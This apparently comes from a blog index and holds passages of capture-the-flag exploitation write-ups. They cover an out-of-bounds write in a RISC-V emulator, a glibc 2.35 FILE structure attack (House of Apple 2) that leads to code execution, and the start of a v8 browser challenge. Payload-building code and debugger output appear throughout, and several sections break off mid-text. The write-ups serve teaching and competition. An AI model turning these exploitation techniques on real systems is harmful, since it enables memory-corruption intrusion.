[{"categories":null,"content":" HackTM CTF 2023 This weekend, I spent my time competing at HackTM CTF 2023 held by WreckTheLine with my local team SKSD. We got 28th place. I managed to solve one pwn challenge called CS2100, and this is my writeup for that challenge. CS2100 To all my CS2100 Computer Organisation students, I hope you've enjoyed the lectures thus far on RISC-V assembly. I have set-up an online service for you to test your own RISC-V code! Simply connect to the service through tcp: nc 34.141.16.87 10000 Credit: Thanks to `@fmash16` for his emulator! I didn't even have to compile the emulator binary myself :O https://github.com/fmash16/riscv_emulator/blob/main/main Attachment: https://drive.google.com/file/d/1fvZ0rfXOPmH_HqpG0tDVaPl45_bKmpGC/view?usp=sharing ","date":"Feb 19, 2023","objectID":"/posts/hacktm-ctf-2023/:0:0","tags":["Writeup","HackTM","pwn","vm","oob","2023"],"title":"HackTM CTF 2023","uri":"/posts/hacktm-ctf-2023/"},{"categories":null,"content":"Initial Analysis We were given a zip file contains: Binary called main File called server.py Libc binary libc-2.31.so Let‚Äôs check the server.py file first #!/usr/bin/env python3 from tempfile import NamedTemporaryFile from subprocess import check_output, Popen, STDOUT, DEVNULL def print_banner(): print(\"\"\" _____ _____ ___ __ ___ ___ / ____|/ ____|__ \\/_ |/ _ \\ / _ \\ | | | (___ ) || | | | | | | | | | \\___ \\ / / | | | | | | | | | |____ ____) |/ /_ | | |_| | |_| | \\_____|_____/|____||_|\\___/ \\___/ \"\"\") def main(): print_banner() s = input(\"Please enter your code (hex-encoded):\\n\") # Remove all whitespace s = ''.join(s.split()) try: d = bytes.fromhex(s) except ValueError: print(\"Invalid hex!\") exit() with NamedTemporaryFile() as temp_file: temp_file.write(d) temp_file.flush() filename = temp_file.name print(\"\\nOutput:\") with Popen([\"./main\", filename], stderr=STDOUT, stdin=DEVNULL) as process: process.wait() if __name__ == \"__main__\": main() Ah okay, so it just read hex-encoded bytecode, stored it in a temporary file, and then pass it to the binary main. The problem description also gives us a link to a github repo. Turn out, the given binary is the compiled version of that repo, which is a riscv emulator. Instead of decompiling the binary, we can just clone the repo and try to analyze the source code. I noticed that this challenge is pretty similar to RealWorld CTF 2023 challenge called tinyvm, where the given repo is a vm of x86 assembly implemented in C, while for this challenge, the repo tries to implement RISC-V emulator. So, based on that experience, I decided to try to look whether there might be Out-of-Bound Read and Write on the given repo, because it is the common mistake of developer during building a simulator. Let‚Äôs first inspect the main.c file: ... int main(int argc, char* argv[]) { if (argc != 2) { printf(\"Usage: rvemu \u003cfilename\u003e\\n\"); exit(1); } // Initialize cpu, registers and program counter struct CPU cpu; cpu_init(\u0026cpu); // Read input file read_file(\u0026cpu, argv[1]); // cpu loop while (1) { // fetch uint32_t inst = cpu_fetch(\u0026cpu); // Increment the program counter cpu.pc += 4; // execute if (!cpu_execute(\u0026cpu, inst)) break; dump_registers(\u0026cpu); if(cpu.pc==0) break; } /*dump_registers(\u0026cpu);*/ return 0; } ... Okay, so basically, the file required us to input a filename, which will be loaded to the CPU struct, and then it will iterate the instructions we supplied in the file. Checking the cpu_execute implementation, the emulator implements a lot of RISC-V instructions. int cpu_execute(CPU *cpu, uint32_t inst) { int opcode = inst \u0026 0x7f; // opcode in bits 6..0 int funct3 = (inst \u003e\u003e 12) \u0026 0x7; // funct3 in bits 14..12 int funct7 = (inst \u003e\u003e 25) \u0026 0x7f; // funct7 in bits 31..25 cpu-\u003eregs[0] = 0; // x0 hardwired to 0 at each cycle /*printf(\"%s\\n%#.8lx -\u003e Inst: %#.8x \u003cOpCode: %#.2x, funct3:%#x, funct7:%#x\u003e %s\",*/ /*ANSI_YELLOW, cpu-\u003epc-4, inst, opcode, funct3, funct7, ANSI_RESET); // DEBUG*/ printf(\"%s\\n%#.8lx -\u003e %s\", ANSI_YELLOW, cpu-\u003epc-4, ANSI_RESET); // DEBUG switch (opcode) { case LUI: exec_LUI(cpu, inst); break; case AUIPC: exec_AUIPC(cpu, inst); break; case JAL: exec_JAL(cpu, inst); break; case JALR: exec_JALR(cpu, inst); break; ... } return 1; } Our target is trying to look at an OOB read or write bug. So, I decided to skim for instructions that related to reading/storing value in memory. And then, I noticed this sequence of actions. void exec_SD(CPU* cpu, uint32_t inst) { uint64_t imm = imm_S(inst); uint64_t addr = cpu-\u003eregs[rs1(inst)] + (int64_t) imm; cpu_store(cpu, addr, 64, cpu-\u003eregs[rs2(inst)]); // \u003c- Let's expand this print_op(\"sd\\n\"); } void cpu_store(CPU* cpu, uint64_t addr, uint64_t size, uint64_t value) { bus_store(\u0026(cpu-\u003ebus), addr, size, value); // \u003c- Let's expand this } void bus_store(BUS* bus, uint64_t addr, uint64_t size, uint64_t value) { dram_store(\u0026(bus-\u003edram), addr, size, value); // \u003c- Let's expand this } void dram_store(DRAM* dram, uint64_t addr, uint64_t size, uint64_t value) { switch (size)","date":"Feb 19, 2023","objectID":"/posts/hacktm-ctf-2023/:1:0","tags":["Writeup","HackTM","pwn","vm","oob","2023"],"title":"HackTM CTF 2023","uri":"/posts/hacktm-ctf-2023/"},{"categories":null,"content":"Exploitation Okay, now that we have found our targeted functions during our initial analysis, to help craft the payload easier, I try to build a helper first in python to generate the file that will be passed to the emulator. registers = [ \"zero\", \"ra\", \"sp\", \"gp\", \"tp\", \"t0\", \"t1\", \"t2\", \"s0\", \"s1\", \"a0\", \"a1\", \"a2\", \"a3\", \"a4\", \"a5\", \"a6\", \"a7\", \"s2\", \"s3\", \"s4\", \"s5\", \"s6\", \"s7\", \"s8\", \"s9\", \"s10\", \"s11\", \"t3\", \"t4\", \"t5\", \"t6\", ] register_key = {} for idx, val in enumerate(registers): register_key[val] = idx def reg(key): return register_key[key] def new_inst(opcode, funct3=0, funct7=0, rd=0, rs1=0, rs2=0, imm_i=0, imm_s=0): inst = 2**32 # Set opcode inst |= (opcode \u0026 0x7f) # Set funct3 inst |= ((funct3 \u0026 0x7) \u003c\u003c 12) # Set funct7 inst |= ((funct7 \u0026 0x7f) \u003c\u003c 25) # Set rd inst |= ((rd \u00260x1f) \u003c\u003c 7) # Set rs1 inst |= ((rs1 \u00260x1f) \u003c\u003c 15) # Set rs2 inst |= ((rs2 \u00260x1f) \u003c\u003c 20) # Set imm_i inst |= ((imm_i \u003c\u003c 20) \u0026 0xfff00000) # Set imm_s inst |= ((imm_s \u003c\u003c 20) \u0026 0xfe000000) inst |= ((imm_s \u0026 0x1f) \u003c\u003c 7) return bytes.fromhex(hex(inst \u0026 (2**32-1))[2:].rjust(8, '0'))[::-1].hex() def dram_load_32(hex_str): bytecode = bytes.fromhex(hex_str) inst = bytecode[0] | bytecode[1] \u003c\u003c 8 | bytecode[2] \u003c\u003c 16 | bytecode[3] \u003c\u003c 24 return inst def exec_SD(addr_reg, offset, value): return new_inst(0x23, funct3=0x3, rs1=addr_reg, rs2=value, imm_s=offset) def exec_LD(addr_reg, offset, reg_target): return new_inst(0x03, funct3=0x3, rs1=addr_reg, rd=reg_target, imm_i=offset) def exec_ADDI(target, src, value): return new_inst(0x13, funct3=0x0, rd=target, rs1=src, imm_i=value) def exec_SLLI(target, src, shift): return new_inst(0x13, funct3=0x1, rd=target, rs1=src, imm_i=shift) def exec_SUBW(target, reg_src, reg_src2): return new_inst(0x3b, funct3=0x0, funct7=0x20, rd=target, rs1=reg_src, rs2=reg_src2) The helper above is built based on inspecting how the cpu_execute function processes the instructions bytecode from the input file. Now that we have set the appropriate helper, let‚Äôs try to execute it for the first time to build our first payload to test it. Below is the example code that I used during analyzing the code. from pwn import * from tempfile import NamedTemporaryFile payload = '' payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) d = bytes.fromhex(payload) with NamedTemporaryFile() as temp_file: temp_file.write(d) temp_file.flush() filename = temp_file.name print(f'Temp filename: {filename}') pause() After running the above code, it will generate a temp file, and then we can use the temp file to run the main in a separate terminal. Trying to use the generated temp file, below is the example output of the emulator 0x80000000 -\u003e addi zero: 00 s0: 00 a6: 00 s8: 00 ra: 00 s1: 00 a7: 00 s9: 00 sp: 0x80100000 a0: 0x41 s2: 00 s10: 00 gp: 00 a1: 00 s3: 00 s11: 00 tp: 00 a2: 00 s4: 00 t3: 00 t0: 00 a3: 00 s5: 00 t4: 00 t1: 00 a4: 00 s6: 00 t5: 00 t2: 00 a5: 00 s7: 00 t6: 00 We have successfully changed the a0 value to 0x41. Now, notice that the sp register value is 0x80100000. Remember that the max size of array mem is 0x100000, and if we try to access the memory of the address 0x80100000, that means we will try to get the value of mem[addr-DRAM_BASE], which is mem[0x100000]. For example, if we try to increase the sp value by 0x10, that means we have achieved OOB access. Let‚Äôs try to check it by using this payload. payload = '' payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) payload += exec_SLLI(reg('a0'), reg('a0'), 8) # Shift left \u003c\u003c 8 payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) payload += exec_SLLI(reg('a0'), reg('a0'), 8) # Shift left \u003c\u003c 8 payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) payload += exec_SLLI(reg('a0'), reg('a0'), 8) # Shift left \u003c\u003c 8 payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) payload += exec_SD(reg('sp'), 0x10, reg('a0')) payload += exec_LD(reg('sp'), 0x58, reg('a1')) # We only add this to set breakpoint in exec_LD, so that we can inspect the memory before the emulator exit The above payload trying to store 0x41414141 to mem[s","date":"Feb 19, 2023","objectID":"/posts/hacktm-ctf-2023/:2:0","tags":["Writeup","HackTM","pwn","vm","oob","2023"],"title":"HackTM CTF 2023","uri":"/posts/hacktm-ctf-2023/"},{"categories":null,"content":" We got 2nd place! Last weekend, I spent my time competing at STACK the Flags CTF 2022 held by GovTech SG with team PDKT then sad. We got 2nd place in the Open Category. Thanks a lot to GovTech SG for the amazing CTF! On this CTF, I managed to solve all of the pwn challenges, and today, I will make a writeup on one of the challenges called Cursed Grimoires, because my solution for that challenge is related to the FILE Structure Attack on the recent GLIBC 2.35 (I‚Äôve made a promise before to continue my FILE Structure Attack series, so I try to make this writeup as detailed as possible during explaining the FILE Structure part). I recommend you to read my first article about FILE Structure Attack in here to get a basic understanding of how FILE Structure Attack works. You can say that this post is like the second part of that article, but focusing only in the glibc 2.35. Cursed Grimoires ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:0:0","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a zip file containing the challenge binary called cursed_grimoires and the libc file that is being used to run the binary. Let‚Äôs start the analysis by checking the properties of the binary via checksec. ‚ï∞‚îÄ‚ùØ checksec cursed_grimoires Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled As we can see, the binary: Full RELRO: It means we can‚Äôt modify the GOT table. Canary found: It means the binary tries to protect against buffer overflow by storing a canary value in the stack (Which will throw an error if we do buffer overflow and overwrite it with an incorrect value). NX enabled: It means the stack area isn‚Äôt executable (We can‚Äôt jump to the address in the stack area). PIE enabled: It means the address of the binary‚Äôs functions itself will be randomized on each execution. Now, let‚Äôs check the libc version ‚ï∞‚îÄ‚ùØ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Okay, the binary used glibc 2.35, which is quite hard to be exploited. Now that we have known the properties, seems like the mitigation are quite strong. Let‚Äôs continue our analysis by disassembling the binary methods one by one. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:0","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"main int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+8h] [rbp-8h] v4 = __readfsqword(0x28u); setup_IO(argc, argv, envp); v3 = 0; while ( 1 ) { while ( 1 ) { menu(); printf(\"\\nEnter choice =\u003e \"); __isoc99_scanf(\"%d\", \u0026v3); if ( v3 != 1 ) break; create_grimoire(); } if ( v3 != 2 ) exit(0); edit_grimoire(); } } From the main function, it will call menu() on each iteration, and we can see that there are three menus that we can select based on our choice‚Äôs input, create_grimoire, edit_grimoire, and exit. Let‚Äôs continue our analysis by disassembling those methods. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:1","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"menu unsigned __int64 menu() { unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); printf(\"\\x1B[2J\\x1B[H\"); puts(s); puts(\"1. Create Grimoire (Only once)\"); puts(\"2. Edit Grimoire\"); puts(\"3. Finish Grimoire\"); return v1 - __readfsqword(0x28u); } Okay, this method just prints the available menus and the number that we should input to choose one of the available menus. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:2","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"create_grimoire unsigned __int64 create_grimoire() { size_t size; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"\\x1B[2J\\x1B[H\"); if ( !GRIMOIRE ) { printf(\"Size of grimoire =\u003e \"); size = 0LL; __isoc99_scanf(\"%zu\", \u0026size); while ( getchar() != 10 ) ; GRIMOIRE = (char *)malloc(size); printf(\"Write your contents =\u003e \"); fgets(GRIMOIRE, size - 1, stdin); } return v2 - __readfsqword(0x28u); } From the disassemble‚Äôs result, we can see that the create_grimoire method will do three sequential operations: Check whether the global variable GRIMOIRE is null or not. This means that we can call create_grimoire only one time per execution. Ask for the size of the grimoire, and then it will call malloc to create a new chunk with the input size. Ask for the content of the newly created chunk. One thing that we can notice in this method is that we can set a big size for the chunk that we want to create because there isn‚Äôt any restriction. Keep this in mind first because this will be useful later. Let‚Äôs move to the edit_grimoire method. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:3","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"edit_grimoire unsigned __int64 edit_grimoire() { char v1; // [rsp+3h] [rbp-Dh] int v2; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"\\x1B[2J\\x1B[H\"); if ( GRIMOIRE ) { printf(\"Index to edit =\u003e \"); __isoc99_scanf(\"%d\", \u0026v2); while ( getchar() != 10 ) ; printf(\"Replacement =\u003e \"); v1 = getchar(); while ( getchar() != 10 ) ; GRIMOIRE[v2] = v1; } return v3 - __readfsqword(0x28u); } At a glance, we can see that this method will allow us to edit the content of the newly allocated chunk. It will only allow us to edit one char per call (Give the index, and then it will replace the stored value in the given index with the new value that you just gave). If we read this function method carefully, notice that there is a bug in this method. There isn‚Äôt any check whether the index that we give is a valid index or not (valid means the index is still inside the allocated chunk‚Äôs area). This means that we can do Out-Of-Bounds write on any address that we like, relative to the chunks. To summarize, some important notes that we have taken from our analysis: There are three menus that we can choose (create, edit, and exit). We can allocate one chunk with any size that we want. There is a bug in the edit method which leads us to OOB write on any address that we want (relative to our allocated chunk‚Äôs address) ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:4","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Exploitation Now, based on those important notes, we need to think about how to abuse the OOB bug that we found so that we can leverage it into Remote-Code-Execution (RCE). Up until now: Even though we have an OOB write, due to ASLR (address randomization), we don‚Äôt know the exact address of our created chunk in the heap nor the offset difference between our targeted address with our chunk. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:2:0","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Leveraging the OOB bug with malloc behavior So, what should we do? Remember that in this binary, we are allowed to allocate a chunk of any size. Let‚Äôs check the manuals of the malloc. Turns out, there are some interesting notes in the man malloc result. NOTES By default, Linux follows an optimistic memory allocation strategy. This means that when malloc() returns non-NULL there is no guarantee that the memory really is available. In case it turns out that the system is out of memory, one or more processes will be killed by the OOM killer. For more information, see the description of /proc/sys/vm/overcommit_memory and /proc/sys/vm/oom_adj in proc(5), and the Linux kernel source file Documentation/vm/overcommit-accounting.rst. Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2). When allocating blocks of memory larger than MMAP_THRESHOLD bytes, the glibc malloc() implementation allocates the memory as a private anonymous mapping using mmap(2). Based on the notes, if we call malloc() with a big size, it will place our chunk in the mmapped page rather than the heap area. And reading through this article that I found, we can learn that a new page created by mmap will have a consistent offset difference from the libc starting area address. To prove this, let‚Äôs fire up our gdb to run the binary multiple time and test it by allocating a chunk with size 1000000. gef‚û§ x/gx \u0026GRIMOIRE 0x55e0067dd030 \u003cGRIMOIRE\u003e: 0x00007f3b78939010 gef‚û§ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x000055e0067d9000 0x000055e0067da000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067da000 0x000055e0067db000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067db000 0x000055e0067dc000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067dc000 0x000055e0067dd000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067dd000 0x000055e0067de000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067de000 0x000055e0067df000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e007bc6000 0x000055e007be7000 0x0000000000000000 rw- [heap] 0x00007f3b78939000 0x00007f3b78a31000 0x0000000000000000 rw- 0x00007f3b78a31000 0x00007f3b78a59000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6 As you can see, the chunk was placed not in the heap, but in a new page created by the mmap, and it was placed just before the libc (The offset difference is 0x00007f3b78a31000 - 0x00007f3b78939010 = 0xf7ff0). Let‚Äôs try to run it one more time to confirm it. gef‚û§ x/gx \u0026GRIMOIRE 0x555555558030 \u003cGRIMOIRE\u003e: 0x00007ffff7c9c010 gef‚û§ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555559000 0x000055555555a000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055555555a000 0x000055555557b000 0x0000000000000000 rw- [heap] 0x00007ffff7c9c000 0x00007ffff7d94000 0x0000000000000000 rw- 0x00007ffff7d94000 0x00007ffff7dbc000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6 Yup, we can confirm that when we allocated a big chunk, the libc_base_address will be at chunk_address + 0xf7ff0. With this piece of informa","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:2:1","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Getting a libc leak Now that we have the power to overwrite any writeable area in the loaded libc, what should we do now? Remember that up until now, we don‚Äôt have any libc address leak yet. So, it would be a good idea to try finding a way on getting the libc leak. One of the ways that I could think of is using a FILE Structure Attack. If you don‚Äôt have any idea or this is your first time hearing about it, I had written some basic knowledge about it in one of my blog‚Äôs articles. I believe that reading through that article first will give you a strong fundamental to understand the exploit for this challenge. One of the tricks related to FILE Structure Attack that we could do to leak the libc address is based on this article. The article explained the trick on leaking the libc, but I will try to break it down one by one again based on what I did to understand the article. Remember that the menu() function will be called on each iteration and it calls puts. So, based on the previous article, if we deep dive into the implementation of puts in the glibc source code, we will get a way to get a libc leak. Let‚Äôs start breaking it down one by one starting from the puts method itself. int _IO_puts (const char *str) { int result = EOF; size_t len = strlen (str); _IO_acquire_lock (stdout); if ((_IO_vtable_offset (stdout) != 0 || _IO_fwide (stdout, -1) == -1) \u0026\u0026 _IO_sputn (stdout, str, len) == len \u0026\u0026 _IO_putc_unlocked ('\\n', stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (stdout); return result; } weak_alias (_IO_puts, puts) libc_hidden_def (_IO_puts) puts is an alias to _IO_puts. As you can see, the _IO_puts will call _IO_sputn (stdout, str, len), which based on this LOC in the glibc source code, is an alias to _IO_XSPUTN (__fp, __s, __n), which means it will jump to the stored pointer for __xsputn key in the stdout FILE. Inspecting via GDB (or you can deep dive its source code as well), stdout vtable mapped the key __xsputn to the _IO_new_file_xsputn method. gef‚û§ print _IO_2_1_stdout_ $4 = { file = { _flags = 0xfbad2887, _IO_read_ptr = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_read_end = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_read_base = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_write_base = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_write_ptr = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", _IO_write_end = 0x7ffff7fae803 \u003c_IO_2_1_stdout_+131\u003e \"\\n\", ... _wide_data = 0x7ffff7fad9a0 \u003c_IO_wide_data_1\u003e, }, vtable = 0x7ffff7faa600 \u003c__GI__IO_file_jumps\u003e } gef‚û§ print __GI__IO_file_jumps $5 = { ... __overflow = 0x7ffff7e20e40 \u003c_IO_new_file_overflow\u003e, __underflow = 0x7ffff7e20b30 \u003c_IO_new_file_underflow\u003e, __uflow = 0x7ffff7e21de0 \u003c__GI__IO_default_uflow\u003e, __pbackfail = 0x7ffff7e23300 \u003c__GI__IO_default_pbackfail\u003e, __xsputn = 0x7ffff7e1f680 \u003c_IO_new_file_xsputn\u003e, ... __write = 0x7ffff7e1ef40 \u003c_IO_new_file_write\u003e, } So now, let‚Äôs check the code. size_t _IO_new_file_xsputn (FILE *f, const void *data, size_t n) { const char *s = (const char *) data; size_t to_do = n; int must_flush = 0; size_t count = 0; ... if (to_do + must_flush \u003e 0) { size_t block_size, do_write; /* Next flush the (full) buffer. */ if (_IO_OVERFLOW (f, EOF) == EOF) /* If nothing else has to be written we must not signal the caller that everything has been written. */ return to_do == 0 ? EOF : n - to_do; /* Try to maintain alignment: write a whole number of blocks. */ block_size = f-\u003e_IO_buf_end - f-\u003e_IO_buf_base; do_write = to_do - (block_size \u003e= 128 ? to_do % block_size : 0); if (do_write) { count = new_do_write (f, s, do_write); to_do -= count; if (count \u003c do_write) return n - to_do; } ... } libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn) If you read the code, it will call _IO_OVERFLOW(f, EOF) before calling new_do_write to write the actual string that we want to print. Based on the vtable above that we see in gdb (the _IO_file_jumps), calling _IO_OVERFLOW equivalents to jump to _IO_new_file_overflow. Let‚Äôs check the disassembly result ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:2:2","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Gaining Remote Code Execution (RCE) Up until now, we have: OOB write to libc area. Libc base address from the leak. We need to leverage the OOB bug and the libc base address leaked info to gain RCE. One thing that comes in mind is using the knowledge that I gathered from the recent discussion about gaining RIP control from FILE structure attack in Glibc 2.35. To give some context, in the old version of glibc, we can overwrite the file-\u003evtable address with our fake vtable, so that let‚Äôs say when a method wants to call _IO_OVERFLOW, instead of jumping to the correct address, it will jump to our desired address that we set in our fake vtable. However, this has been mitigated because the glibc will check whether the vtable that is stored in the FILE is in the correct region or not. Check the below LOCs: static inline const struct _IO_jump_t * IO_validate_vtable (const struct _IO_jump_t *vtable) { /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; uintptr_t ptr = (uintptr_t) vtable; uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables; if (__glibc_unlikely (offset \u003e= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable; } #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-\u003eFUNC) (THIS, X1) # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) #define _IO_JUMPS_FILE_plus(THIS) \\ _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable) Taking example let‚Äôs say a method tries to call _IO_OVERRFLOW, it will try to do the jump to the stored pointer in the vtable value mapped with key __overflow, and before jumping into it, it will validate first whether the stored pointer is in the valid area or not by calling IO_validate_vtable. So that trick where we set up our fake vtable to jump to a method outside the vtable section area no longer works. However, because the check only validates whether the stored pointer is in vtable region or not, we can still misalign the table (For example, shift the vtable by one entry, so that when a function called _IO_OVERFLOW, it will jump to _IO_UNDERFLOW instead due to the misalignment). People try to find a way to abuse this check, and recently in this article by kylebot, he found that the glibc does the check only when jumping with macro _IO_JUMPS_FUNC, but it didn‚Äôt validate the check when it uses a macro to jump to the wide_vtable, which is _IO_WIDE_JUMPS_FUNC. Also turns out, there is another article that has been published a few months ago that tried to abuse the same finding from kylebot. The method is called House of Apple 2, which was posted by roderick01 in this article. I‚Äôll try to explain it in more detail based on my understanding during reading these two blogs. Remember that the mitigation those were implemented in the recent glibc only checks whether the vtable stored in the FILE properties is still in the correct region or not. And the standard vtable that is being used for stdfile is _IO_file_jumps. But in fact, there is a lot of other vtable in the region that we can use, and one of them is _IO_wfile_jumps. Below is the default entry of the _IO_wfile_jumps printed via gdb: gef‚û§ print __GI__IO_wfile_jumps $11 = { __dummy = 0x0, __dummy2 = 0x0, __finish = 0x7ffff7e20070 \u003c_IO_new_file_finish\u003e, __overflow = 0x7ffff7e1a410 \u003c__GI__IO_wfile_overflow\u003e, __underflow = 0x7ffff7e19050 \u003c__GI__IO_wfile_underflow\u003e, __uflow = 0x7ffff7e178c0 \u003c__GI__IO_wdefault_uflow\u003e, __pbackfail = 0x7ffff7e17680 \u003c__GI__IO_wdefault_pbackfail\u003e, __xsputn = 0x7ffff7e1a8c0 \u003c__GI__IO_wfile_xsputn\u003e, __xsgetn = 0x7ffff7e1f330 \u003c__GI__IO_file_xsgetn\u003e, __seekoff = 0x7ffff7e197d0 \u003c__GI__IO_wfile_seekoff\u003e, __seekpos = 0x7ffff7e22530 \u003c_IO_default_seekpos\u003e, __setbuf = 0x7ffff7e1e620 \u003c_IO_new_file_setbuf\u003e, __sync =","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:2:3","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":" HITCON CTF 2022 During the weekends, I spent my time working on the HITCON CTF challenge called ‚ÄúFourchain - Hole‚Äù. This is my first time doing a v8 browser pwn challenge, so I would like to apologize in advance if there is any mistake in my explanations and feel free to correct me if I‚Äôm wrong. Fourchain - Hole There's a hole in the program ? Well I'm sure it's not that of a big deal, after all it's just a small hole that won't do any damage right ? ... Right üò® ? Author: bruce30262 ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:0:0","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Initial Analysis This is a v8 browser challenge. We were given a zip consisting: The d8 binary. This is a v8 developer shell that can execute javascript code. add_hole.patch. This is the patch for the particular challenge. README.txt. This contains information about the args that the author specified during building the d8 binary, the commit hash that we should use to build it (which is 63cb7fb817e60e5633fb622baf18c59da7a0a682), and a hint that we should prepare our exploit in Debian Linux 11.5. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:0","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Prerequisite I highly recommend you read this great article to gain some fundamentals on how v8 works. But keep in mind that the article is already outdated because v8 has changed some of their objects‚Äô internal representation after the publication of that article. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:1","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Environment Setup To start the challenge, we should prepare our environment first. Below is the summary of what I did to 